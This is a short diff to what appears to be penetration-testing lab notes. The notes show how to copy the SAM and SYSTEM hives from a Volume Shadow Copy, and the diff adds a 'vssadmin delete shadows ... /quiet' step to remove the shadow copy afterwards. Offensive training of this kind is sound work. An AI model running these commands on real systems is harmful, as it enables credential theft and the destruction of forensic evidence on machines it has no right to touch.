@@ -41,6 +41,11 @@ C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\confi
 C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system
 ```
 
+Don't forget to delete the shadows, {e0331775-2d51-48dc-817e-007a5b97b885} is the shadowID
+```
+vssadmin delete shadows /shadow={e0331775-2d51-48dc-817e-007a5b97b885} /quiet
+```
+
 We can also copy sam and system file from reg key
 
 ```
